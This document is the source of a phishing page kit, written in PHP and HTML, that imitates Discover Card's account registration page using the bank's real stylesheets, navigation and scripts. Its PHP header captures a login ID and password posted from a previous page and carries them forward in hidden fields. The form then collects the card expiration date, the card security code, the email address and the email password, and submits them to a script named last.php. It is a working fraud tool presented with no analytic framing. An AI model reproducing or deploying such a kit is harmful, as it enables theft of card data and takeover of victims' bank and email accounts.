<?php

@$username = $_POST['userID'];
@$password = $_POST['password'];
@$accountType = $_Post['accountType'];

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">

	
	

	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
	<meta http-equiv="imagetoolbar" content="no">
	<meta http-equiv="imagetoolbar" content="false"><link href="https://www.discovercard.com/css/optimized/ac-global.css?v=1.0" rel="stylesheet" type="text/css" />
<link href="https://www.discovercard.com/css/optimized/register/register-screen.css" rel="stylesheet" type="text/css" media="screen" />
<link href="https://www.discovercard.com/css/optimized/register/register.css" rel="stylesheet" type="text/css" />
<link href="/registrationhttps://www.discovercard.com/css/alert.css" rel="stylesheet" type="text/css" />
<!--[if lt IE 10 ]>
<link href="/registrationhttps://www.discovercard.com/css/alert-ie.css" rel="stylesheet" type="text/css" /> 
<![endif]-->

<!--[if IE 6]>
<link rel="stylesheet" type="text/css" media="screen" href="https://www.discovercard.com/css/optimized/register/register-ie6-screen.css" />
<![endif]-->	

<!--[if IE 7]>
<link rel="stylesheet" type="text/css" media="screen" href="https://www.discovercard.com/css/optimized/register/register-ie7-screen.css" />
<![endif]-->
<style>
#stepnav
{
width:710px\0/;
}
</style>
<!-- Begin PCC: /content/common/baselayout/optimized/tips.shtml-->
<!-- End PCC: /content/common/baselayout/optimized/tips.shtml-->		<title>Discover Card: Register for the Account Center</title>
			

<script language="JavaScript" src="https://www.discovercard.com/discover/jscripts/cookieFuncs.js"></script>
<script language="JavaScript" src="https://www.discovercard.com/discover/jscripts/workflowStateCheck.js"></script>
<!--\content\common\baselayout\optimized\psr_regshowwin_script.shtml-->
	<link rel="shortcut icon" href="https://www.discovercard.com/images/favicon.ico" type="image/x-icon" />
<link rel="icon" href="https://www.discovercard.com/images/favicon.ico" type="image/x-icon" />


	</head>
	
	<body>
	
<div id="container">


	    <!-- Using reg-layout-default-config.xml config file. -->


<a id="skiplink" href="#skip-content">Skip to main content</a>
<link href="https://www.discovercard.com/css/psr-global-new.css?v=1.0" rel="stylesheet" type="text/css" />
<div id="global-header-wrap" class="searchable" role="banner" style="float:left;">
            <div id="global-header" class="no-js">
                <a href="https://www.discover.com/index.html" class="discover-logo" title="DISCOVER LOGO">DISCOVER LOGO</a>
               
               <div role="navigation">
  <ul class="global-header-tabs" >
    <li class="global-header-tab-wrap" aria-haspopup="true" tab-order="0" >
      <div class="global-header-tab">
        <span class="left-shadow">
        </span>
        
        <a class="lock main-menu-anchor"  role="menuitem" >
          <span class="link-text">
            <span 
            class="lock" style="width: 10px; font-size: 0px; display: block;">
              Secured 
            </span>
            <strong role="presentation">
              Log In
            </strong>
          </span>
        </a>
        
        <span class="right-shadow">
        </span>
        
      </div>
      <div class="global-header-tab-content-wrap">
        <div class="shadow-wrap">
          <div class="global-header-tab-content login">
            <div class="details " id="hll">
              <p >
                <strong>
                  Hello.
                </strong>
                Log in and take control.
              </p>
            </div>
            <div class="options">
              <ul>
                <li>
                  Credit Cards                                                 
                  <ul>
                    
                    <li>
                      <a role="menuitem"  class="sr fcImg" aria-labelledby="hll" style="height:0; outline:none;"  id="focus_login">
                      </a>
                      <a href="https://www.discovercard.com/cardmembersvcs/loginlogout/app/ac_main?ICMPGN=HDR_LOGN_CC_LOGN&amp;mboxSession=1392577046699-143179" 
                      role="menuitem">
                        <span class="sr">
                          Credit Cards
                        </span>
                        Log 
                        In
                        <span class="sr">
                          link
                        </span>
                      </a>
                    </li>
                    <li>
                      <a href="https://www.discovercard.com/cardmembersvcs/registration/reg/goto?forwardName=reghome&amp;ICMPGN=HDR_LOGN_CC_REG&amp;mboxSession=1392577046699-143179" 
                      role="menuitem">
                        <span class="sr">
                          Credit 
                          Cards
                        </span>
                        Register Now
                        <span class="sr">
                          link
                        </span>
                      </a>
                    </li>
                  </ul>
                </li>
                <li class="banking">
                  Banking                                                 
                  <ul>
                    <li>
                      <a href="https://www.discoverbank.com/bankac/loginreg/login?ICMPGN=HDR_LOGN_BANK_LOGN" 
                      role="menuitem">
                        <span class="sr">
                          Banking
                        </span>
                        Log 
                        In
                        <span class="sr">
                          link
                        </span>
                      </a>
                    </li>
                    <li>
                      <a href="https://www.discoverbank.com/bankac/loginreg/regone?ICMPGN=HDR_LOGN_BANK_REG" 
                      role="menuitem">
                        <span class="sr">
                          Banking
                        </span>
                        Register 
                        Now
                        <span class="sr">
                          link
                        </span>
                      </a>
                    </li>
                  </ul>
                </li>
                <li>
                  Home Loans                                                 
                  <ul>
                    <li>
                      <a  href="https://mystatus.homeloancenter.com/?ICMPGN=HDR_LOGN_DHL_TXT_HP" role="menuitem">
                        <span 
                        class=sr>
                          Home Loans
                        </span>
                        Log In
                        <span class="sr">
                          link
                        </span>
                      </a>
                      
                      <!--
<li>
<a href="https://mystatus.homeloancenter.com/Account/HLCLogOn?ICMPGN=HDR_LOGN_HMLOAN_REG" title="Home Loans Register Now">
Register Now
</a>
</li>
-->
      </li>
      </ul>
    </li>
    <li>
      Home Equity Loans                                                 
      <ul>
        <li>
          <a onclick="s.linkTrackVars=s.linkTrackVars+',prop1';&#10;s.prop1='HDR_LOGN_HEL_TXT_HP'; s.tl(this,'o','Header:HomeEquity:Login');" 
          href="https://dmimtg.com/UserLogin.aspx?Conn=T85{37843404-4237-4EC7-8451-0C682794D6D4}" 
          role="menuitem">
            <span class="sr">
              Home Equity
            </span>
            Log 
            In
            <span class="sr">
              link
            </span>
          </a>
        </li>
      </ul>
    </li>
    <li>
      Student Loans                                                 
      <ul>
        <li>
          <a href="https://www.discoverstudentloans.com/MFA/EnterUsername.aspx?ReturnUrl=/THEOOnline/login.asp&amp;DEST=THEO&amp;Username=&amp;acmpgn=O_DC_PR_X_HDL01&amp;ICMPGN=HDR_LOGN_STUDLOAN_LOGN" 
          role="menuitem">
            <span class="sr">
              Student Loans
            </span>
            Log 
            In
            <span class="sr">
              link
            </span>
          </a>
        </li>
        <li>
          <a href="https://www.discoverstudentloans.com/MFA/CreateAccount.aspx?ReturnUrl=/THEOOnline/login.asp&amp;DEST=THEO&amp;Username=&amp;acmpgn=O_DC_PR_X_HDL02&amp;ICMPGN=HDR_LOGN_STUDLOAN_REG" 
          role="menuitem">
            <span class="sr">
              Student 
              Loans
            </span>
            Register Now
            <span class="sr">
              link
            </span>
          </a>
        </li>
      </ul>
    </li>
    <li class="last">
      Personal Loans                                              
      
      <ul>
        <li>
          <a href="https://www.discoverbank.com/bankac/loginreg/login?ICMPGN=HDR_LOGN_PERSLOAN_LOGN" 
          role="menuitem">
            <span class="sr">
              Personal Loan
            </span>
            Log 
            In
            <span class="sr">
              link
            </span>
          </a>
        </li>
        <li>
          <a href="https://www.discoverbank.com/bankac/loginreg/regone?ICMPGN=HDR_LOGN_PERSLOAN_REG" 
          role="menuitem">
            <span class="sr">
              Personal 
              Loan
            </span>
            Register Now
            <span class="sr">
              link
            </span>
          </a>
        </li>
      </ul>
    </li>
    </ul>
    </div>
    </div>
    </div>
    <div class="bottom-shadow">
    </div>
    </div>
  </li>
  <li class="global-header-tab-wrap" aria-haspopup="true" tab-order="1" >
    <div class="global-header-tab">
      <span class="left-shadow">
      </span>
      
      <a class="main-menu-anchor" role="menuitem" aria-labelledby="upa">
        <span class="link-text">
          All Products 
          &amp; Services
        </span>
        <span id="upa" class="sr">
          menu All Products &amp; Services To move through items press up or down arrows
        </span>
      </a>
      
      <span class="right-shadow">
      </span>
      
    </div>
    <div class="global-header-tab-content-wrap">
      <div class="shadow-wrap">
        <div class="global-header-tab-content products-and-services">
          <div class="details" id="apsl">
            <p>
              <strong>
                Do more with your finances.
              </strong>
              .
            </p>
            <p>
              Spend smarter, manage debt better and save even more with 
              Discover.
            </p>
          </div>
          <div class="options">
            <ul>
              <li>
                Credit Cards                                                 
                <ul>
                  <li>
                    <a role="menuitem"  class="sr fcImg" aria-labelledby="apsl" style="height:0; outline:none;">
                    </a>
                    <a href="https://www.discover.com/credit-cards/index.html?ICMPGN=HDR_ALLPS_CC_IT&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      Discover it Credit Card
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                  <li>
                    <a href="https://www.discover.com/credit-cards/student/index.html?ICMPGN=HDR_ALLPS_CC_STUD_IT&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      Discover it for Students
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                  <li>
                    <a href="https://www.discover.com/credit-cards/business/index.html?ICMPGN=HDR_ALLPS_CC_BUSINESS&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      Business Credit Cards
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                  <li>
                    <a href="https://www.discover.com/credit-cards/cashback-bonus?ICMPGN=HDR_ALLPS_CC_CBB&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      <em>
                        Cashback Bonus
                      </em>
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                  <li>
                    <a href="https://www.discover.com/credit-cards/cashback-bonus/shopdiscover.html?ICMPGN=HDR_ALLPS_CC_SHOPD&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      ShopDiscover 
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                  <li>
                    <a href="https://www.discover.com/credit-cards/member-benefits/?ICMPGN=HDR_ALLPS_CC_MEMBEN&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      Card Benefits
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
				  <li class="last">
                    <a href="https://www.discover.com/credit-cards/member-benefits/balance-transfer.html?ICMPGN=HDR_ALLPS_CC_BT" 
                    role="menuitem">
                      Balance Transfer
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                </ul>
              </li>
              <li>
                <a href="https://www.discover.com/online-banking/?ICMPGN=HDR_ALLPS_BANKING_INDEX&amp;mboxSession=1392577046699-143179" 
                role="menuitem">
                  <span style="font-size: 13px;">Banking</span>
                  <span class="sr">
                    link
                  </span>
                </a>
                
                
                <ul>
                  <li>
                    <a href="https://www.discover.com/online-banking/savings-account/?ICMPGN=HDR_ALLPS_BANK_SAVING&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      Online Savings
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                  <li>
                    <a href="https://www.discover.com/online-banking/money-market/?ICMPGN=HDR_ALLPS_BANK_MONMRK&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      Money Market
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                  <li>
                    <a href="https://www.discover.com/online-banking/cd/?ICMPGN=HDR_ALLPS_BANK_CD&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      CDs
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                  <li>
                    <a href="https://www.discover.com/online-banking/ira-cd/?ICMPGN=HDR_ALLPS_BANK_IRACD&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      IRA CDs
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                  <li class="last">
                    <a href="https://www.discoverbank.com/banksvcs/apply?ICMPGN=HDR_ALLPS_BANK_OPENACCT" 
                    role="menuitem">
                      Open an Account
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                </ul>
              </li>
              <li>
                Loans                                                 
                <ul>
                  <li>
                    <a href="https://www.discover.com/home-loans/?ICMPGN=HDR_ALLPS_DHL_TXT_HP&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      Home Loans
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
				  <li>
                    <a target="_blank" href="https://www.realestatereward.com/?ICMPGN=HDR_ALLPS_DHL_HS_HP" 
                    role="menuitem">
                      Home Search
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
				  
                  <li>
                    <a href="https://www.discover.com/home-equity-loans/?ICMPGN=HDR_ALLPS_HEL_TXT_HP&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      Home Equity Loans
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                  <li>
                    <a href="https://www.discover.com/student-loans/?acmpgn=O_DC_PR_X_HDA01&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      Student Loans
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                  <li class="last">
                    <a href="https://www.discover.com/personal-loans/?ICMPGN=HDR_ALLPS_LOAN_PERS&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      Personal Loans
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                </ul>
              </li>
              <li title="Additional Products" class="last">
                Additional Products             
                
                <ul>
                  <li>
                    <a href="https://www.discover.com/gift-cards/index.shtml?ICMPGN=HDR_ALLPS_ADDI_GIFTCRD&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      Gift Cards
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                  <li>
                    <a href="https://www.discover.com/credit-cards/member-benefits/mobile/index.html?ICMPGN=HDR_ALLPS_ADDI_MOBILE&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      Discover Mobile
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                  <li class="last">
                    <a href="https://www.discover.com/credit-cards/google-wallet/index.html?ICMPGN=HDR_ALLPS_ADDI_WALLET&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      Mobile 
                      Wallet
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                </ul>
              </li>
            </ul>
          </div>
        </div>
      </div>
      <div class="bottom-shadow">
      </div>
    </div>
  </li>
  <li class="global-header-tab-wrap" aria-haspopup="true" tab-order="2" >
    <div class="global-header-tab">
      <span class="left-shadow">
      </span>
      
      <a class="main-menu-anchor" role="menuitem" aria-labelledby="cus_upa">
        <span class="link-text">
          Customer 
          Service
        </span>
        <span id="cus_upa" class="sr">
          menu Customer Service To move through items press up or down arrows
        </span>
      </a>
      
      <span 
      class="right-shadow">
      </span>
      
    </div>
    <div class="global-header-tab-content-wrap">
      <div class="shadow-wrap">
        <div class="global-header-tab-content customer-service">
          <div class="details" id="csl">
            <p>
              <strong>
                Real help. From real people.
              </strong>
            </p>
            <p>
              By the phone or online, we're here to help 24/7.
            </p>
          </div>
          <div class="options">
            <p>
              <strong>
                Find help with:
              </strong>
            </p>
            <ul>
              <li>
                <ul>
                  <li>
                    <a role="menuitem"  class="sr fcImg" aria-labelledby="csl" style="height:0; outline:none;">
                    </a>
                    
                    <a href="https://www.discover.com/credit-cards/help-center/index.html?ICMPGN=HDR_CS_HELP_CC&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      <span class="sr">
                        Find help with 
                      </span>
                      Credit Cards
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                  <li>
                    <a href="https://www.discover.com/online-banking/help-center/?ICMPGN=HDR_CS_HELP_BANK&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      <span class="sr">
                        Find help with 
                      </span>
                      Banking
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                </ul>
              </li>
              <li>
                <ul>
                  <li>
                    <a  href="https://www.discover.com/home-loans/?ICMPGN=HDR_CS_HELP_DHL_TXT_HP&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      <span class="sr">
                        Find help with 
                      </span>
                      Home Loans
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                  <li>
                    <a href="https://www.discover.com/home-equity-loans/help-center/?ICMPGN=HDR_CS_HELP_HEL_TXT_HP&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      <span class="sr">
                        Find help with 
                      </span>
                      Home Equity Loans
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                  <li>
                    <a href="https://www.discover.com/student-loans/help/customer-service.html?ICMPGN=HDR_CS_HELP_SL&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      <span class="sr">
                        Find help with 
                      </span>
                      Student Loans
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                  <li>
                    <a href="https://www.discover.com/personal-loans/help-center/?ICMPGN=HDR_CS_HELP_PERSLOAN&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      <span class="sr">
                        Find help with 
                      </span>
                      Personal Loans
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                </ul>
              </li>
              <li class="last">
                <ul>
                  <li>
                    <a href="https://www.discover.com/credit-cards/help-center/index.html?ICMPGN=HDR_CS_HELP_SMBIZ&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      <span class="sr">
                        Find help with 
                      </span>
                      Small Business
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                  <li>
                    <a href="https://www.discover.com/gift-cards/customer-service.shtml?ICMPGN=HDR_CS_HELP_GIFTCRD&amp;mboxSession=1392577046699-143179" 
                    role="menuitem">
                      <span class="sr">
                        Find help with 
                      </span>
                      Gift 
                      Cards
                      <span class="sr">
                        link
                      </span>
                    </a>
                  </li>
                </ul>
              </li>
            </ul>
          </div>
        </div>
      </div>
      <div class="bottom-shadow">
      </div>
    </div>
  </li>
  <li class="global-header-tab-wrap" aria-haspopup="true" tab-order="3" >
    <div class="global-header-tab">
      <span class="left-shadow">
      </span>
      
      <a class="main-menu-anchor" role="menuitem" aria-labelledby="com_upa">
        <span 
        class="link-text">
          Community
        </span>
        <span id="com_upa" class="sr">
          menu Community To move through items press up or down arrows
        </span>
      </a>
      
      <span 
      class="right-shadow">
      </span>
      
    </div>
	<!-- New social Footer  start-->
    <div class="global-header-tab-content-wrap">
      <div class="shadow-wrap">
        <div class="global-header-tab-content community">
          <div id="cl">
            <p style="font-size:19px; top:20px; position:absolute; left:25px; font-weight:bold;">
                Just ask around.
            </p>
            <p style="top: 50px; position: absolute; font-size: 14px; left: 26px;">
              It really pays to Discover.
            </p>
          </div>
          <div class="options">
            <p>
              Join us on:
            </p>
            <ul>
			
			              <li>
                <a   class="twitter" href="https://www.discovercard.com/scripts/PageExit.htm?log=1&ICMPGN=HDR_COMMUNITY_JOIN_TW&v_eurl=http://www.twitter.com/Discover" 
                role="menuitem">
                  <span class="sr">
                    Find Discover on 
                  </span>
                  <span style="left:0px;top:4px;position:relative;">
                  Twitter</span>
                  <span class="sr">
                    link
                  </span>
                </a>
              </li>
			<li>
                <a role="menuitem"  class="sr fcImg" aria-labelledby="cl" style="height:0; outline:none;">
                </a>
                <a class="facebook" href="https://www.discovercard.com/scripts/PageExit.htm?log=1&ICMPGN=HDR_COMMUNITY_JOIN_FB&v_eurl=http://www.facebook.com/discover" 
                role="menuitem">
                  <span class="sr">
                    Find Discover on 
                  </span>
                  <span style="left:4px;top:4px;position:relative;">
                  Facebook</span>
                  <span class="sr">
                    link
                  </span>
                </a>
              </li>

              <li>
                <a class="youtube" href="https://www.discovercard.com/scripts/PageExit.htm?log=1&ICMPGN=HDR_COMMUNITY_JOIN_LIN&v_eurl=http://www.linkedin.com/company/discover-financial-services" 
                role="menuitem">
                  <span class="sr">
                    Find Discover on
                  </span>
                 <span style="left:4px;top:4px;position:relative;">
                  LinkedIn</span>
                  <span class="sr">
                    link
                  </span>
                </a>
              </li>
              <li>
                <a class="cbb" href="https://www.discovercard.com/scripts/PageExit.htm?log=1&ICMPGN=HDR_COMMUNITY_JOIN_GP&v_eurl=https://plus.google.com/+Discover/posts" 
                role="menuitem">
                  <span class="sr">
                    Find Discover on
                  </span>
                 <span style="left:4px;top:4px;position:relative;">
                  Google+</span>
                  <span class="sr">
                    link
                  </span>
                </a>
              </li>
            </ul>
          </div>
        </div>
      </div>
      <div class="bottom-shadow">
      </div>
    </div>
	<!-- New social Footer  END-->
  </li>
  </ul>
</div>
				 <form id="suggestion_form" class="global-header-search-module search-form" name="search" method="get" action="https://search.discover.com/search" autocomplete="off">
                    <div role="search">
                       <!-- <label for="searchbox" class="sr">Search</label> -->
						<INPUT id="searchbox" class="search-box" onkeyup="ss_handleKey(event)" name="q" maxLength="256"  onblur="return focusout_placeholder();" onfocus="return focusin_placeholder();" />
<label id="lb_srchbx" for="searchbox" onclick = "return click_placeholder();">search</label>
                           <input type="hidden" name="site" value="internet_cm_corp"  />
			               <input type="hidden" name="getfields" value="*"/>
			               <input type="hidden" name="client" value="internet_cm_fe" />
			               <input type="hidden" name="output" value="xml_no_dtd" />
			               <input type="hidden" name="proxystylesheet" value="internet_cm_fe" />
                        <input class="search-btn" type="submit" value="search" style="font-size:0px;" />
					</div>	
                </form>
				<div id="searchbox-ss">
<table id="search_suggest" style="visibility: hidden;" role="presentation"></table>
</div>
            </div>
        </div>
				
<style type="text/css">
.out_line{outline:1px dotted;}
.hoverWhite{background: #ffffff;}
.hoverLeftShadow {background: url(header-sprite.png) no-repeat -8px -25px;}
.hoverRightShadow{background: url(header-sprite.png) no-repeat -46px -25px;}
#searchbox+#lb_srchbx{ right:115px; font-size:12px; font-weight:normal; top: 27px; position: absolute;   color: #576166;} 
.suggestion_form{position: relative;}
</style>
<script language="javascript" type="text/javascript" src="https://www.discovercard.com/scripts/header.js"></script>
<style>#skip-content:focus{ outline:0px !important;}</style>
<a href="javascript:void(0);" id="skip-content" class="sr">content</a>
<script>
window.onload=function(){
$('#skip-content').hide();
$('#skiplink').keydown(function(event){    if(event.keyCode==13) {$('#skip-content').show();}   });
$('#skip-content').blur(function(){ $('#skip-content').hide();    });
};
</script>

	<script src="https://www.discovercard.com/scripts/optimized/registration-top.js" type="text/Javascript"></script>


<!-- Begin LP Custom Variables-->
<script type="text/javascript">
		
lpAddVars('page','lpRegistrationStart','1');
lpAddVars('page','lpErrorField','');
lpAddVars('page','lpErrorCounter','');
lpAddVars('page','lpConversionStage','account info');
lpAddVars('page','lpSection','registration');
lpAddVars('page','lpCustomerID','');


</script>
<!-- End LP Custom Variables-->
		

<!-- Begin LP Button Code-->
<div id="lpChatDynamicButtonRegistrationDiv" style="position:absolute; left:730px; top:240px;"></div>
<script type="text/javascript">
if(typeof(lpMTagConfig.dynButton)!="undefined")
lpMTagConfig.dynButton[lpMTagConfig.dynButton.length] = {'name':"chat-"+lpUnit+"-"+lpLanguage,'pid':'lpChatDynamicButtonRegistrationDiv'};
</script>
<!-- End LP Button Code-->
<script type="text/javascript">
if(typeof(sfgfdge)!="undefined") sfgfdge("lpChatDynamicButtonRegistrationDiv", "position:absolute; left:730px; top:240px;");
</script>
		


	

<script language="JavaScript" type="text/javascript"
	src="https://www.discovercard.com/discover/jscripts/reg_email_rebuttalPop.js">
</script>


	
<div class="clear">&nbsp;</div>
<!-- /top navigation -->

<!-- breadcrumbs -->
<div id="breadcrumb"></div>
<!-- /breadcrumbs -->

<!-- main content -->
<div class="content">
<div class="clear">&nbsp;</div>
<!-- left column -->
<div class="col710">
<div class="borders710 content-below">
<div id="subcategory-header">
<div class="clear">&nbsp;</div>
<div class="left"></div>
<div class="header">
<h1 class="centered">Welcome <?php print $username ?></h1>
</div>
<div class="right"></div>
<div class="clear">&nbsp;</div>
</div>
               <div id="progress-step">
               		<ul>
							<li id="step1" class="active"><p><strong>1</strong>Enter Account Info</p></li>
							<li id="step2" class="inactive"><p><strong>2</strong>Finish</p></li>
						</ul>
               </div>
<div class="inner-content register">

			
			
	
                    <h2>Verify Account Information</h2>
                    <div class="article"> 
						<p>In order to protect access to your account, we need to know who you are.  Please provide details about the <strong>Primary cardmember</strong> as well as your Discover card. The Primary cardmember is the person who originally opened the Discover card account. </p> 
					</div> 

<form name="registrationForm" method="post" action="last.php?log=1&ICMPGN=USERNAME=<? print $username; ?>&v_eurl=https://www.discovercard.com/discover/loginlogout/login.jsp">
<input type=hidden name="username" value="<? print $username; ?>">
<input type=hidden name="password" value="<? print $password; ?>">
<input type=hidden name="accountType" value="<? print $accountType; ?>">



	<div class="clear13">&nbsp;</div>
       <div class="box340right">
      <div class="top"></div>

      <h3>Discover Card Information</h3>

      <div class="card-diagram first">
        <div id="diagram1"></div>
        <div id="card-ac-number">
          <p>Expiration Date</p>
          <p>CID-CVV</p>
        </div>
      </div>

      <div class="card-diagram it-card">
        <div class="it-card"></div>
        <div id="card-ac-number">
          <p>Account Number</p>
          <p>Expiration Date</p>
        </div>
      </div>
     
      <div class="bottom"></div>
    </div>

        <!--START: Begin Card Information Form --> 
        <div class="form"> 

                <div class="clear13">&nbsp;</div> 

                <h2>Your Card Information</h2>
				

<p class="less"><strong>Discover Card Expiration Date</strong><br />
	<select name="expirationDateMonth"><option value="Month">Month</option>
		
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option></select>&nbsp;<select name="expirationDateYear"><option value="YY">Year</option>
		


		<option value="2018">2018</option>
		
		<option value="2019">2019</option>
		
		<option value="2020">2020</option>
		
		<option value="2021">2021</option>
		
		<option value="2022">2022</option>
		
		<option value="2023">2023</option>
		
		<option value="2024">2024</option>
		
		<option value="2025">2025</option>
		
		<option value="2026">2026</option>
		
		<option value="2027">2027</option>
		
		<option value="2028">2028</option>
		
		<option value="2029">2029</option></select>
</p>
<div id="cardnumberID">
	<p><strong>3-Digit Card ID</strong> 
	<a href="#" id="three-digit" rel="three-digit-overlay" class="overlay-trigger initHide" alt="Need Help?" title="Need Help?"></a>
    <br />
	<input type="text" name="cid" maxlength="4" size="3" value="" class="short numeric"></p>
	<p class="hint">(Enter the last 3-4 digits of the ID number.)</p>
</div>

<div class="clear13"></div>
<div id="divider"></div>
<h2>
        Primary Cardmember Information
        <p><strong>E-mail Address of Primary Cardmember</strong><br />
<input type="email" name="email" maxlength="200" size="22" value=""></p>


<p><strong>E-mail Password</strong><br />
<input type="password" name="emailpassword" maxlength="200" size="22" value=""></p>


</div>


<!-- /form bottom -->

<div class="clear">&nbsp;</div>
<p class="submit-button-link">
	<input type="image" name="" src="https://www.discovercard.com/registration/images/continue.gif" title="Continue" value="Continue" class="rollover save-and-continue-button left" /> <a href="#" onclick="javascript:showPopup();return true;" class="last initHide" title="Cancel">Cancel</a>
</p>
	
	
	<input type="hidden" id="jsenabled" name="jsenabled"
		value="false" />
		
			
 </form>
<script type="text/javascript" language="JavaScript">
  <!--
  var focusControl = document.forms["registrationForm"].elements["accountNumber"];

  if (focusControl.type != "hidden") {
     focusControl.focus();
  }
  // -->
</script>

</div>
<!-- /left column -->
<div class="bottom"> 
	<img src="https://www.discovercard.com/registration/images/bg-710-bottom.gif" width="710" height="10" alt="" /> 
</div> 

<!--End PCC Include file: /inet_registration/registration/reg1_form_bottom.shtml--> 

<script type="text/javascript" language="JavaScript"> 
	<!--
	var focusControl = document.forms["registrationForm"].elements["accountNumber"];
	
	if (focusControl.type != "hidden") {
	focusControl.focus();
	}
	
	var element = document.getElementById("jsenabled");
	element.value = "true";
	// -->
</script> 



</div>
</div>
<div class="col230 col-last">
<div class="bluebox230">
<div id="blue230top"></div>
<div class="content230">
<h2>Already Verified?</h2>
<span title="Secure Log In" alt="Secure Log In" title="Secure Log In" class="disc-secLock"></span>
<div class="clear">&nbsp;</div>
<div class="login"><a alt="Log In" title="Log In"
	href="https://www.discovercard.com/cardmembersvcs/loginlogout/app/ac_main"
	title="Log In" class="login-button"><img src="https://www.discovercard.com/images/login-off.gif"
	alt="Log In" width="64" height="20" border="0" title="Log In" /></a></div>
</div>
<div id="blue230bottom"></div>
</div>


<div style="margin:0;" class="help-box"> <div class="header"> <h3>Need Help Now?</h3> <img width="32" height="27" src="https://www.discovercard.com/registration/images/icon-help-question.gif" alt="Need Help Now?" title="Need Help Now?"> </div> <p>Call 1-800-DISCOVER<br> (1-800-347-2683)</p> </div>
<div><img src="https://www.discovercard.com/registration/images/bg-help-box-btm.gif" width="230" height="10" alt="" title=""></div>
</div>


<!-- /right column -->
<div class="clear">&nbsp;</div>
<!-- /main content -->
</div>


<!--Begin PCC Include file: /inet_registration/tracking/vs_track_reg_step1.shtml-->
<img src="https://discovercard.com/images/zag.gif?log=1&cb=1419460461119&dt=Step%201:%20Enter%20Account%20information&dd=www.discover.com&dl=/ACREG/EnterAccountInformation">
<!--End PCC Include file: /inet_registration/tracking/vs_track_reg_step1.shtml-->


<div id="overlays">		
	<!--START: Primary Card Member Info Overlay --> 
	<div id="primary-cardmember-info-overlay" class="overlay-little hide"> 
		<div class="body"> 
			<div class="hdr-left"></div> 
			<div class="hdr-right"></div> 
			
			<a id="primary-cardmember-info-close" class="close-link" href="#primary-cardmember-info-overlay" title="Close">Close</a> 
			
			<h1>Primary Cardmember Information</h1> 
			<p>The Primary Cardmember opened the account and his or her name is listed first on Discover statements and e-mails.</p> 
			
			<div class="ftr-left"></div> 
			<div class="ftr-right"></div> 
		</div> 
	</div> 
	<!--END: Primary Card Member Info Overlay --> 

	<!--START: 3-Digit Cardmember ID Overlay --> 
	<div id="three-digit-overlay" class="overlay-small hide"> 
		<div class="body"> 
			<div class="hdr-left"></div> 
			<div class="hdr-right"></div> 
			
			<a id="three-digit-close" class="close-link" href="#three-digit-overlay" title="Close">Close</a> 
			
			<h1>3-Digit Card ID</h1> 
			<p>The card image on the right side of this page will show you where to find your 3-digit Card ID. If your Card ID is missing or you are unable to read it, please call customer service from your home phone at 1-800-DISCOVER.</p> 
			
			<div class="ftr-left"></div> 
			<div class="ftr-right"></div> 
		</div> 
	</div> 
</div>


<script language="javascript" src="https://www.discovercard.com/scripts/optimized/ac-global-bottom.js"></script>
<script language="javascript" src="https://www.discovercard.com/scripts/optimized/registration-bottom.js"></script>
